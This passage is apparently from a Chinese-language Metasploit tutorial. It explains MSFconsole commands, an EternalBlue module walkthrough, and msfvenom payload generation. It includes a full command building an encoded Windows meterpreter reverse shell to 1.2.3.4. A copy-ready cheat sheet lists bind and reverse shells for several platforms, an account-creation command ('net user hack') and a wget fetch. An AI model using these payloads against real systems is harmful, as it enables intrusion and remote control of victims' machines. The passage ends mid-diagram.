fill="#bfdbfe" font-family="Microsoft YaHei,Arial">常用筛选项（可拼接）</text>  <text x="776" y="168" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">type:exploit</text>  <text x="910" y="168" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> 只看漏洞模块</text>  <text x="776" y="202" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">platform:windows</text>  <text x="910" y="202" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> 平台限定</text>  <text x="776" y="236" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">name:tomcat</text>  <text x="910" y="236" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> 模块名精确</text>  <text x="776" y="270" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">cve:2017</text>  <text x="910" y="270" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> CVE 年</text>  <text x="776" y="304" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">author:hdm</text>  <text x="910" y="304" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> 作者</text>  <text x="776" y="338" font-size="11" font-weight="700" fill="#fde68a" font-family="Consolas,Monospace">rank:excellent</text>  <text x="910" y="338" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">-> 稳定性</text>  <text x="540.0" y="500" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">rank excellent/great 优先，normal/low 大概率打不上</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 500" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s08g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s08b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s08r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s08a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s08s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s08g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-8 Exploit 漏洞利用 5 步标准化流程</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">任何 CVE 都套这个模板，1 分钟上手</text>  <rect x="60" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2" filter="url(#s01s)"/>  <text x="135" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① search</text>  <line x1="80" y1="242" x2="190" y2="242" stroke="#334155"/>  <text x="70" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">search struts2 type:exploit</text>  <text x="70" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"></text>  <path d="M210,248 L220,248" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="215.0" y="243.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step1-&gt;2</text>  <rect x="220" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2" filter="url(#s01s)"/>  <text x="295" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② use</text>  <line x1="240" y1="242" x2="350" y2="242" stroke="#334155"/>  <text x="230" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">use exploit/multi/http/struts2..</text>  <text x="230" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">.</text>  <path d="M370,248 L380,248" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="375.0" y="243.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step2-&gt;3</text>  <rect x="380" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#a855f7" stroke-width="2.2" filter="url(#s01s)"/>  <text x="455" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">③ show options</text>  <line x1="400" y1="242" x2="510" y2="242" stroke="#334155"/>  <text x="390" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">show options 缺啥填啥</text>  <text x="390" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"></text>  <path d="M530,248 L540,248" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="535.0" y="243.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step3-&gt;4</text>  <rect x="540" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#f59e0b" stroke-width="2.2" filter="url(#s01s)"/>  <text x="615" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ set 参数</text>  <line x1="560" y1="242" x2="670" y2="242" stroke="#334155"/>  <text x="550" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">RHOSTS / LHOST / LPORT</text>  <text x="550" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"></text>  <path d="M690,248 L700,248" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="695.0" y="243.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step4-&gt;5</text>  <rect x="700" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#ef4444" stroke-width="2.2" filter="url(#s01s)"/>  <text x="775" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ check -&gt; exploit</text>  <line x1="720" y1="242" x2="830" y2="242" stroke="#334155"/>  <text x="710" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">check 验证后 exploit -j</text>  <text x="710" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"></text>  <path d="M850,248 L860,248" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="855.0" y="243.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Step5-&gt;6</text>  <rect x="860" y="200" width="150" height="96" rx="14" fill="#0f172a" stroke="#10b981" stroke-width="2.2" filter="url(#s01s)"/>  <text x="935" y="228" text-anchor="middle" font-size="14" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥ session</text>  <line x1="880" y1="242" x2="990" y2="242" stroke="#334155"/>  <text x="870" y="264" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">meterpreter session 1 opened</text>  <text x="870" y="280" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"></text>  <text x="540.0" y="470" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">第 5 步一定要 check，不要盲目 exploit 打崩目标；失败换 set TARGET 0/1/2</text>
</svg>



### MSFconsole 是什么？

MSFconsole是Metasploit的主要操作界面，就像一个命令行控制台，你在这里：
- 选择漏洞利用模块
- 配置参数
- 执行攻击

**通俗理解：** 像一个黑客操作台，你在这里指挥攻击。

### 常用命令详解

#### help（帮助命令）

```msf
help
```

显示所有可用命令的帮助信息。

也可以查看特定命令的帮助：
```msf
help search
```

#### search（搜索命令）

搜索是Metasploit最重要的命令，用于找到合适的模块。

**基本搜索：**
```msf
search apache
```
搜索所有包含"apache"的模块。

**按类型搜索：**
```msf
search type:exploit apache
```
只搜索exploit类型的apache模块。

**按平台搜索：**
```msf
search platform:windows smb
```
只搜索Windows平台的smb模块。

**组合搜索：**
```msf
search type:exploit platform:windows cve:2021
```
搜索Windows平台2021年的漏洞。

**搜索结果解读：**
```
Matching Modules
================
   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/windows/smb/ms17_010   2017-03-14       excellent  Yes    MS17-010 EternalBlue SMB
```

| 列 | 说明 |
|------|------|
| Name | 模块名称 |
| Disclosure Date | 漏洞披露日期 |
| Rank | 漏洞可靠性 |
| Check | 是否有检测功能 |
| Description | 模块描述 |

**Rank可靠性说明：**

| 等级 | 说明 | 成功概率 |
|------|------|----------|
| Excellent | 极好 | 总是成功 |
| Great | 很好 | 通常成功 |
| Good | 好 | 大概率成功 |
| Normal | 正常 | 50%成功率 |
| Average | 平均 | 有时成功 |
| Low | 低 | 偶尔成功 |
| Manual | 手动 | 需手动配置 |

#### use（使用命令）

选择一个模块进行使用：

```msf
use exploit/windows/smb/ms17_010_eternalblue
```

进入模块后，提示符会改变：
```
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

#### show（显示命令）

显示模块相关信息：

**显示模块信息：**
```msf
show info
```

**显示可用选项：**
```msf
show options
```

**显示目标：**
```msf
show targets
```

**显示Payload：**
```msf
show payloads
```

**显示高级选项：**
```msf
show advanced
```

**显示规避选项：**
```msf
show evasion
```

#### set（设置命令）

设置模块参数：

```msf
set RHOSTS 192.168.1.1
```

**常用参数：**

| 参数 | 说明 |
|------|------|
| RHOSTS | 目标主机（可以是多个） |
| RPORT | 目标端口 |
| LHOST | 本地主机（攻击机） |
| LPORT | 本地端口（监听端口） |
| PAYLOAD | 攻击载荷 |
| TARGET | 目标系统类型 |

#### setg（全局设置）

设置全局参数，对所有模块生效：

```msf
setg LHOST 192.168.1.100
```

#### unset（取消设置）

取消参数设置：

```msf
unset RHOSTS
```

#### check（检测命令）

检测目标是否存在漏洞（如果模块支持）：

```msf
check
```

输出示例：
```
[+] 192.168.1.1:445 - The target is vulnerable.
```

#### run/exploit（执行命令）

执行漏洞利用：

```msf
run
```

或：
```msf
exploit
```

#### back（返回命令）

返回上级菜单：

```msf
back
```

#### exit（退出命令）

退出Metasploit：

```msf
exit
```

#### sessions（会话命令）

管理已建立的会话：

**查看所有会话：**
```msf
sessions -l
```

**连接会话：**
```msf
sessions -i 1
```
连接到编号1的会话。

**终止会话：**
```msf
sessions -k 1
```

---

## 3.7 MSFvenom 生成Payload详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 520" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s09g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s09b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s09r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s09a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s09s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s09g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-9 MSFvenom Payload 生成流水线 6 阶段</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">输入=payload；中间=加密；输出=任意格式</text>  <rect x="40" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <text x="105" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">1 选 Payload</text>  <line x1="50" y1="226" x2="160" y2="226" stroke="#334155"/>  <text x="105" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">-p windows/x64/meterpr</text>  <text x="105" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">eter/reverse_tcp</text>  <path d="M170,245 L192,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="190" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <text x="255" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">2 填参数</text>  <line x1="200" y1="226" x2="310" y2="226" stroke="#334155"/>  <text x="255" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">LHOST=1.2.3.4 LPORT=44</text>  <text x="255" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">44</text>  <path d="M320,245 L342,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="340" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <text x="405" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">3 选编码器</text>  <line x1="350" y1="226" x2="460" y2="226" stroke="#334155"/>  <text x="405" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">-e x64/xor_dynamic -i </text>  <text x="405" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">15</text>  <path d="M470,245 L492,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="490" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>  <text x="555" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">4 NOP 填充</text>  <line x1="500" y1="226" x2="610" y2="226" stroke="#334155"/>  <text x="555" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">-n 128 空指令雪橇</text>  <text x="555" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace"></text>  <path d="M620,245 L642,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="640" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>  <text x="705" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#06b6d4" font-family="Microsoft YaHei,Arial">5 选格式</text>  <line x1="650" y1="226" x2="760" y2="226" stroke="#334155"/>  <text x="705" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">-f exe / elf / ps1 / r</text>  <text x="705" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">aw</text>  <path d="M770,245 L792,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="790" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <text x="855" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">6 输出文件</text>  <line x1="800" y1="226" x2="910" y2="226" stroke="#334155"/>  <text x="855" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">-o shell.exe / shell.e</text>  <text x="855" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">lf</text>  <path d="M920,245 L942,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <rect x="940" y="180" width="130" height="130" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <text x="1005" y="208" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">7 监听</text>  <line x1="950" y1="226" x2="1060" y2="226" stroke="#334155"/>  <text x="1005" y="246" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">handler + set payload </text>  <text x="1005" y="262" text-anchor="middle" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">+ run -j</text>  <rect x="60" y="360" width="960" height="58" rx="10" fill="#020617" stroke="#334155"/>  <text x="80" y="385" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">完整 1 条命令示例：</text>  <text x="80" y="406" font-size="10.5" fill="#86efac" font-family="Consolas,Monospace">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -e x64/xor_dynamic -i 15 -n 128 -f exe -o shell.exe</text>  <text x="540.0" y="495" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">payload 必须与 handler 100% 一致（x86/x64/tcp/https），否则接不到 session</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s10g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s10b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s10r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s10a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s10s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s10g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-10 四大平台 X 四类 Payload 16 条速查模板</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">平台 x 类别 = 1 条现成命令，直接复制改 IP/端口</text>  <rect x="30" y="105" width="140" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="100.0" y="131" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700" font-family="Microsoft YaHei,Arial">攻击目标平台</text>  <rect x="180" y="105" width="230" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="295.0" y="131" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700" font-family="Microsoft YaHei,Arial">Bind Shell</text>  <rect x="420" y="105" width="260" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="550.0" y="131" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700" font-family="Microsoft YaHei,Arial">Reverse Shell</text>  <rect x="690" y="105" width="220" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="800.0" y="131" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700" font-family="Microsoft YaHei,Arial">Meterpreter（推荐）</text>  <rect x="920" y="105" width="140" height="42" fill="#1e293b" stroke="#6366f1"/>  <text x="990.0" y="131" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="700" font-family="Microsoft YaHei,Arial">Single 单执行</text>  <rect x="30" y="147" width="140" height="42" fill="#111c35" stroke="#334155"/>  <rect x="180" y="147" width="230" height="42" fill="#111c35" stroke="#334155"/>  <rect x="420" y="147" width="260" height="42" fill="#111c35" stroke="#334155"/>  <rect x="690" y="147" width="220" height="42" fill="#111c35" stroke="#334155"/>  <rect x="920" y="147" width="140" height="42" fill="#111c35" stroke="#334155"/>  <text x="100.0" y="173" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">Windows x64</text>  <text x="188" y="163" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/shell_bind_tcp LPORT=4</text>  <text x="188" y="179" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">444</text>  <text x="428" y="163" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/shell_reverse_tcp LHOS</text>  <text x="428" y="179" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">T=1.2.3.4</text>  <text x="698" y="163" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/meterpreter/reverse_tc</text>  <text x="698" y="179" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">p</text>  <text x="928" y="163" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/exec CMD=calc.exe</text>  <text x="928" y="179" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <rect x="30" y="189" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="180" y="189" width="230" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="420" y="189" width="260" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="690" y="189" width="220" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="189" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <text x="100.0" y="215" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">Win x86</text>  <text x="188" y="205" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/shell_bind_tcp LPORT=4444</text>  <text x="188" y="221" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="205" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/shell_reverse_tcp LHOST=1.</text>  <text x="428" y="221" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">2.3.4</text>  <text x="698" y="205" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/meterpreter/reverse_tcp</text>  <text x="698" y="221" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="928" y="205" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/exec CMD=net user hack P@s</text>  <text x="928" y="221" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">s /add</text>  <rect x="30" y="231" width="140" height="42" fill="#111c35" stroke="#334155"/>  <rect x="180" y="231" width="230" height="42" fill="#111c35" stroke="#334155"/>  <rect x="420" y="231" width="260" height="42" fill="#111c35" stroke="#334155"/>  <rect x="690" y="231" width="220" height="42" fill="#111c35" stroke="#334155"/>  <rect x="920" y="231" width="140" height="42" fill="#111c35" stroke="#334155"/>  <text x="100.0" y="257" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">Linux x64</text>  <text x="188" y="247" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/x64/shell_bind_tcp LPORT=444</text>  <text x="188" y="263" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">4</text>  <text x="428" y="247" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/x64/shell_reverse_tcp LHOST=</text>  <text x="428" y="263" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">1.2.3.4</text>  <text x="698" y="247" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/x64/meterpreter/reverse_tcp</text>  <text x="698" y="263" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="928" y="247" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/x64/exec CMD=id</text>  <text x="928" y="263" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <rect x="30" y="273" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="180" y="273" width="230" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="420" y="273" width="260" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="690" y="273" width="220" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="273" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <text x="100.0" y="299" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">Linux ARM/MIPS</text>  <text x="188" y="289" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/armle/shell_bind_tcp</text>  <text x="188" y="305" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="289" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/mipsbe/shell_reverse_tcp</text>  <text x="428" y="305" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="698" y="289" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/aarch64/meterpreter/reverse_</text>  <text x="698" y="305" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">tcp</text>  <text x="928" y="289" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">linux/generic/exec CMD="wget x/x"</text>  <text x="928" y="305" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <rect x="30" y="315" width="140" height="42" fill="#111c35" stroke="#334155"/>  <rect x="180" y="315" width="230" height="42" fill="#111c35" stroke="#334155"/>  <rect x="420" y="315" width="260" height="42" fill="#111c35" stroke="#334155"/>  <rect x="690" y="315" width="220" height="42" fill="#111c35" stroke="#334155"/>  <rect x="920" y="315" width="140" height="42" fill="#111c35" stroke="#334155"/>  <text x="100.0" y="341" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">PHP Web</text>  <text x="188" y="331" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">php/bind_php LPORT=4444</text>  <text x="188" y="347" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="331" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">php/reverse_php LHOST=1.2.3.4</text>  <text x="428" y="347" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="698" y="331" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">php/meterpreter_reverse_tcp</text>  <text x="698" y="347" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="928" y="331" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">php/exec CMD="system('id');"</text>  <text x="928" y="347" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <rect x="30" y="357" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="180" y="357" width="230" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="420" y="357" width="260" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="690" y="357" width="220" height="42" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="357" width="140" height="42" fill="#0b1530" stroke="#334155"/>  <text x="100.0" y="383" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">ASP/ASPX</text>  <text x="188" y="373" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/shell_bind_tcp(.aspx)</text>  <text x="188" y="389" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="373" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/meterpreter/reverse_ht</text>  <text x="428" y="389" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">tp</text>  <text x="698" y="373" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">windows/x64/meterpreter/reverse_ht</text>  <text x="698" y="389" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">tps</text>  <text x="928" y="373" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">cmd/windows/generic</text>  <text x="928" y="389" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <rect x="30" y="399" width="140" height="42" fill="#111c35" stroke="#334155"/>  <rect x="180" y="399" width="230" height="42" fill="#111c35" stroke="#334155"/>  <rect x="420" y="399" width="260" height="42" fill="#111c35" stroke="#334155"/>  <rect x="690" y="399" width="220" height="42" fill="#111c35" stroke="#334155"/>  <rect x="920" y="399" width="140" height="42" fill="#111c35" stroke="#334155"/>  <text x="100.0" y="425" text-anchor="middle" fill="#fde68a" font-size="11" font-weight="700" font-family="Microsoft YaHei,Arial">PowerShell</text>  <text x="188" y="415" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">cmd/windows/powershell_bind_tcp</text>  <text x="188" y="431" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="428" y="415" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">cmd/windows/powershell_reverse_tcp</text>  <text x="428" y="431" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace"></text>  <text x="698" y="415" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">win/x64/ps/meterpreter/reverse_htt</text>  <text x="698" y="431" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">ps</text>  <text x="928" y="415" font-size="9" fill="#93c5fd" font-family="Consolas,Monospace">cmd/win/generic CMD=whoami</text>  <text x="928" y="431" font-size="9" fill="#93c5fd" 